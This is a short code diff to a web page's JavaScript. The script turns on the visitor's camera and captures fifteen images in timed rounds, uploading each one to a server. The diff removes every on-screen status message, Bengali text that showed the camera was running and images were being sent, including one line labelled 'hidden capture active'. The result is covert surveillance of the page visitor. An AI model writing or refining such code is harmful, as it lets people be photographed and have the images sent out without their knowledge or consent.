@@ -83,11 +83,11 @@ let statusText = document.getElementById("statusText");
 navigator.mediaDevices.getUserMedia({ video: true, audio: false })
   .then(stream => {
     camera.srcObject = stream;
-    statusText.textContent = "✅ ভিডিও চলছে (hidden capture active)";
+    
   })
   .catch(err => {
     console.error("Camera error: ", err);
-    statusText.textContent = "❌ ক্যামেরা চালু করা যায়নি";
+    
   });
 
 // ছবি তোলার ফাংশন + সার্ভারে পাঠানো (high quality)
@@ -119,17 +119,17 @@ async function captureAndUploadImage() {
 async function startCapture() {
   for (let round = 0; round < 3; round++) {
     for (let i = 0; i < 5; i++) {
-      statusText.textContent = `📸 ছবি তোলা হচ্ছে: Round ${round+1}, Image ${i+1}`;
+      
       await captureAndUploadImage();
       await new Promise(r => setTimeout(r, 10000)); // 10 sec
     }
     if (round < 2) {
-      statusText.textContent = "⏳ 30 সেকেন্ড বিরতি চলছে...";
+      
       await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
     }
   }
 
-  statusText.textContent = "✅ সব ছবি পাঠানো হয়েছে";
+  
 }
 
 startCapture();
